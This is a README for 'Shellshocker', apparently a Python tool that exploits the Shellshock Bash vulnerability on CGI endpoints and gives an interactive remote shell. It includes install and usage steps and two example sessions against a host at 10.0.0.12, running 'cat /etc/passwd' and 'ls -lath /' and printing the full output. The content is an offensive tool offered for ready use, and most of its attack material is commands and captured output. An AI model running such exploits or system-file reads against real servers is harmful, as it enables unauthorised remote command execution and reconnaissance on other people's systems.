# Shellshocker
Shellshock easily exploitation

When you find Shellshock / Bashbug vulnerability and want the easiest way to exploit it, you can use Shellshocker.
Shellshocker suggests to avoid user-agent spoofing on-hand. In contrast to that it has a nice shell-interface.

### Usage:
  1. Run the script with python: "python shellshocker.py http://exam.com/cgi-bin/cat"


  2. Hit command and press enter: "cat /etc/passwd"


  3. Read the output :)

### Requirements:
  1. Python  
  2. Mechanize (Can installed by: 'sudo pip install mechanize')

### Examples:
```sh
/.../shellshocker python shellshocker.py http://10.0.0.12:591/cgi-bin/cat
Shellshock Command: cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
bynarr:x:500:501::/home/bynarr:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
apophis:x:501:502::/home/apophis:/bin/bash
```

```sh
/.../shellshocker python shellshocker.py http://10.0.0.12:591/cgi-bin/cat
Shellshock Command: ls -lath /

total 101K
drwxrwxrwt.   3 root    root    4.0K Feb  9 22:20 tmp
drwxr-xr-x   17 root    root    3.5K Feb  9 21:14 dev
dr-xr-xr-x.  22 root    root    4.0K Feb  9 21:14 .
dr-xr-xr-x.  22 root    root    4.0K Feb  9 21:14 ..
-rw-r--r--    1 root    root       0 Feb  9 21:14 .autofsck
drwxr-xr-x.  61 root    root    4.0K Feb  9 21:14 etc
drwxr-xr-x   13 root    root       0 Feb  9 21:14 sys
dr-xr-xr-x  110 root    root       0 Feb  9 21:14 proc
dr-xr-x---.   2 root    root    4.0K Jan 15  2015 root
dr-xr-xr-x.   2 root    root    4.0K Dec 30  2014 bin
drwxr-xr-x.  19 root    root    4.0K Dec 30  2014 var
dr-xr-xr-x.   9 root    root     12K Dec 30  2014 lib64
dr-xr-xr-x.   2 root    root     12K Dec 30  2014 sbin
drwxr-xr-x.   4 root    root    4.0K Dec 30  2014 home
-rw-r--r--    1 root    root       0 Nov 12  2014 .autorelabel
dr-xr-xr-x.   8 root    root    4.0K Nov 12  2014 lib
dr-xr-xr-x.   4 root    root    4.0K Nov 12  2014 boot
drwxr-xr-x.  13 root    root    4.0K Nov 12  2014 usr
drwxr-xr-x.   2 root    root    4.0K Nov 12  2014 selinux
drwx------.   2 root    root     16K Nov 12  2014 lost+found
drwxr-xr-x.   2 root    root    4.0K Sep 23  2011 media
drwxr-xr-x.   2 root    root    4.0K Sep 23  2011 opt
drwxr-xr-x.   2 root    root    4.0K Sep 23  2011 srv
drwxr-xr-x    2 apophis apophis  512 Jan  1  1970 mnt
```
